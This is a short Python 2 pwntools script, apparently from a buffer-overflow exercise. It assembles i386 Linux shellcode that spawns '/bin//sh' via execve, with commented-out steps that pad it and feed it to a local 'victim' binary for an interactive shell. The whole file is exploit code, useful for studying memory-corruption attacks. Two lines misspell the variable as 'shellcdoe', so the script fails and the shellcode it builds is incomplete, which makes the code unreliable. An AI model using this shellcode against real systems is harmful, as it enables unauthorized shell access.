#!/usr/bin/env python

from pwn import *

context(arch = 'i386', os = 'linux')


# shellcode = 'a' * 0x204 
shellcode = ''
shellcode += asm('xor %eax, %eax')
shellcode += asm('push %eax')
shellcode += asm('push $0x68732f2f')
shellcode += asm('push $0x6e69622f')
shellcode += asm('mov %esp, %ebx')
shellcdoe += asm('push %eax')
shellcode += asm('push %ebx')
shellcdoe += asm('mov %esp, %ecx')
shellcode += asm('movb $0x0b, %al')
shellcode += asm('int $0x80')

# length = len(shellcode)

# shellcode += 'a' * (0x204 - length)


# conn = process(['./bin/victim', shellcode])
# conn.interactive()

print shellcode
